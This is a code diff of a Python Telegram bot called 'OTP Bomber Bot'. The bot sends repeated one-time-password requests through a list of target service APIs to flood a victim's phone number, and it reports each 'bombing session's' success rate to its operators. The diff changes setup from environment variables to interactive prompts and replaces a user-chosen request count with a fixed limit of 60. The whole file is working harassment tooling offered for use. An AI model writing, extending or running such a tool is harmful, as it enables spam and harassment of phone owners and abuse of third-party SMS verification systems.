@@ -54,38 +54,39 @@ def save_config():
         return False
 
 def setup_config():
-    """Non-interactive config for cloud deployment"""
+    """Interactive configuration setup"""
     print("\n" + "="*50)
-    print("🤖 OTP Bomber Bot - Auto Setup (Render mode)")
+    print("🤖 OTP Bomber Bot - First Time Setup")
     print("="*50)
-
-    import os
-    bot_token = os.getenv("BOT_TOKEN")
-    chat_id = os.getenv("CHAT_ID")
-
+    
+    bot_token = input("\nEnter your Telegram Bot Token: ").strip()
     if not bot_token:
-        print("❌ BOT_TOKEN not found in environment variables!")
+        print("❌ Bot token is required!")
         return False
-    if not chat_id or not chat_id.isdigit():
-        print("❌ CHAT_ID not found or invalid! It must be numeric.")
+    
+    chat_id = input("Enter your Chat ID (numeric): ").strip()
+    if not chat_id.isdigit():
+        print("❌ Chat ID must be numeric!")
         return False
-
+    
     bot_config['bot_token'] = bot_token
     bot_config['admin_user_ids'] = [int(chat_id)]
     bot_config['setup_complete'] = True
-
+    
     if save_config():
         print("✅ Configuration saved successfully!")
+        print("\n📝 Configuration Summary:")
         print(f"   Bot Token: {bot_token[:10]}...{bot_token[-5:]}")
         print(f"   Admin Chat ID: {chat_id}")
-        print("🚀 Starting bot...")
+        print("\n🚀 Starting bot...")
         return True
     else:
         print("❌ Failed to save configuration!")
         return False
+
 # --- OTP Bombing Engine ---
 SLEEP_TIME = 1
-DEFAULT_MAX_REQUESTS = 60
+MAX_GLOBAL_REQUESTS = 60
 
 TARGET_APIS = [
     {
@@ -142,10 +143,9 @@ TARGET_APIS = [
 ]
 
 class OTPBomber:
-    def __init__(self, phone_number, session_id, max_requests, update_callback=None):
+    def __init__(self, phone_number, session_id, update_callback=None):
         self.phone_number = phone_number
         self.session_id = session_id
-        self.max_requests = max_requests
         self.update_callback = update_callback
         self.is_running = False
         self.stats = {
@@ -168,7 +168,7 @@ class OTPBomber:
         self.stats['start_time'] = datetime.now()
         
         # Send only the essential starting message
-        self.send_update(f"🚀 Starting OTP bombing session for: `{self.phone_number}`\n📊 Target requests: `{self.max_requests}`")
+        self.send_update(f"🚀 Starting OTP bombing session for: `{self.phone_number}`")
         
         global_request_counter = 0
         
@@ -184,7 +184,7 @@ class OTPBomber:
                 self.send_update("🛑 All APIs are rate-limited or inactive. Stopping session.")
                 break
                 
-            if global_request_counter >= self.max_requests:
+            if global_request_counter >= MAX_GLOBAL_REQUESTS:
                 self.send_update("✅ Maximum request limit reached. Session completed.")
                 break
                 
@@ -257,12 +257,11 @@ class OTPBomber:
 📊 **BOMBING SESSION COMPLETE**
 
 📱 Target: `{self.phone_number}`
-🎯 Target Requests: {self.max_requests}
 ⏰ Duration: {duration.total_seconds():.1f} seconds
 📤 Total Requests: {self.stats['total_requests']}
 ✅ Successful: {self.stats['successful_requests']}
 ❌ Failed: {self.stats['failed_requests']}
-📈 Success Rate: {success_rate:.1f}%
+🎯 Success Rate: {success_rate:.1f}%
 
 Session ID: `{self.session_id}`
         """
@@ -271,7 +270,6 @@ Session ID: `{self.session_id}`
         # Store in history
         session_history[self.session_id] = {
             'phone_number': self.phone_number,
-            'max_requests': self.max_requests,
             'total_requests': self.stats['total_requests'],
             'successful_requests': self.stats['successful_requests'],
             'failed_requests': self.stats['failed_requests'],
@@ -354,7 +352,7 @@ async def show_active_sessions(query):
         sessions_text += f"""
 📱 **Target:** `{bomber.phone_number}`
 🆔 **Session ID:** `{session_id}`
-📊 **Progress:** {bomber.stats['total_requests']}/{bomber.max_requests}
+📊 **Progress:** {bomber.stats['total_requests']}/{MAX_GLOBAL_REQUESTS}
 ✅ **Success:** {bomber.stats['successful_requests']}
 ⏰ **Running:** {duration.total_seconds():.1f}s
 ---
@@ -378,7 +376,6 @@ async def show_session_history(query):
     for session_id, history in list(session_history.items())[-5:]:
         history_text += f"""
 📱 Target: `{history['phone_number']}`
-🎯 Target Requests: {history['max_requests']}
 📅 Date: {history['end_time'].strftime('%Y-%m-%d %H:%M')}
 📊 Requests: {history['total_requests']} | ✅ {history['successful_requests']}
 ⏰ Duration: {history['duration']:.1f}s
@@ -399,7 +396,7 @@ async def show_settings(query):
 🤖 Bot Status: ✅ Running
 👥 Admin Users: {len(admin_ids)}
 🎯 Available APIs: {len(TARGET_APIS)}
-📈 Default Max Requests: {DEFAULT_MAX_REQUESTS}
+📈 Max Requests/Session: {MAX_GLOBAL_REQUESTS}
 
 *Configuration File:* `{CONFIG_FILE}`
 *Admin Chat IDs:* {', '.join(map(str, admin_ids))}
@@ -411,7 +408,7 @@ async def show_settings(query):
     await query.edit_message_text(settings_text, reply_markup=reply_markup, parse_mode='Markdown')
 
 async def handle_phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle phone number input and ask for request count"""
+    """Handle phone number input and start bombing session"""
     if not context.user_data.get('awaiting_phone'):
         return
         
@@ -423,49 +420,12 @@ async def handle_phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE
         return
         
     context.user_data['awaiting_phone'] = False
-    context.user_data['phone_number'] = phone_number
-    context.user_data['awaiting_request_count'] = True
-    
-    await update.message.reply_text(
-        "🔢 **How many requests do you want to send?**\n\n"
-        f"Default: `{DEFAULT_MAX_REQUESTS}` requests\n"
-        "Minimum: `10` requests\n"
-        "Maximum: `500` requests\n\n"
-        "Please send a number (10-500) or send /default for default value:",
-        parse_mode='Markdown'
-    )
-
-async def handle_request_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle request count input and start bombing session"""
-    if not context.user_data.get('awaiting_request_count'):
-        return
-        
-    user_input = update.message.text.strip()
-    phone_number = context.user_data['phone_number']
-    
-    # Process request count
-    if user_input == '/default':
-        max_requests = DEFAULT_MAX_REQUESTS
-    else:
-        try:
-            max_requests = int(user_input)
-            if max_requests < 10:
-                await update.message.reply_text("❌ Minimum 10 requests required. Using default value.")
-                max_requests = DEFAULT_MAX_REQUESTS
-            elif max_requests > 500:
-                await update.message.reply_text("❌ Maximum 500 requests allowed. Using 500.")
-                max_requests = 500
-        except ValueError:
-            await update.message.reply_text("❌ Invalid number. Using default value.")
-            max_requests = DEFAULT_MAX_REQUESTS
-    
-    context.user_data['awaiting_request_count'] = False
     
     # Generate session ID
     session_id = str(uuid.uuid4())[:8]
     
     # Create bomber instance
-    bomber = OTPBomber(phone_number, session_id, max_requests, update_callback=send_telegram_update)
+    bomber = OTPBomber(phone_number, session_id, update_callback=send_telegram_update)
     
     # Store session
     active_sessions[session_id] = {
@@ -483,8 +443,8 @@ async def handle_request_count(update: Update, context: ContextTypes.DEFAULT_TYP
         f"**PERFECT BOOMBER:**\n"
         f"🚀 Bombing Session Started\n\n"
         f"📱 Target: `{phone_number}`\n"
-        f"🎯 Target Requests: `{max_requests}`\n"
         f"🆔 Session ID: `{session_id}`\n"
+        f"⏰ Max Requests: {MAX_GLOBAL_REQUESTS}\n"
         f"📊 Target APIs: {len(TARGET_APIS)}\n\n"
         f"Real-time updates will be sent here...",
         parse_mode='Markdown'
@@ -569,7 +529,7 @@ async def show_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
 📈 Total Requests (Historical): {total_historical_requests}
 ✅ Total Success (Historical): {total_historical_success}
 🎯 Available APIs: {len(TARGET_APIS)}
-⏰ Default Request Limit: {DEFAULT_MAX_REQUESTS} per session
+⏰ Request Limit: {MAX_GLOBAL_REQUESTS} per session
     """
     
     await update.message.reply_text(stats_text, parse_mode='Markdown')
@@ -599,14 +559,6 @@ async def handle_back_button(update: Update, context: ContextTypes.DEFAULT_TYPE)
     """Handle back to main menu"""
     query = update.callback_query
     await query.answer()
-    
-    # Clear any pending user data
-    if 'awaiting_phone' in context.user_data:
-        del context.user_data['awaiting_phone']
-    if 'awaiting_request_count' in context.user_data:
-        del context.user_data['awaiting_request_count']
-    if 'phone_number' in context.user_data:
-        del context.user_data['phone_number']
     
     keyboard = [
         [InlineKeyboardButton("🚀 Start Bombing", callback_data="start_bombing")],
@@ -679,7 +631,6 @@ def main():
         application.add_handler(CallbackQueryHandler(stop_all_callback, pattern="^stop_all$"))
         
         application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone_number))
-        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_request_count))
 
         # Start bot
         print("✅ Bot started successfully!")
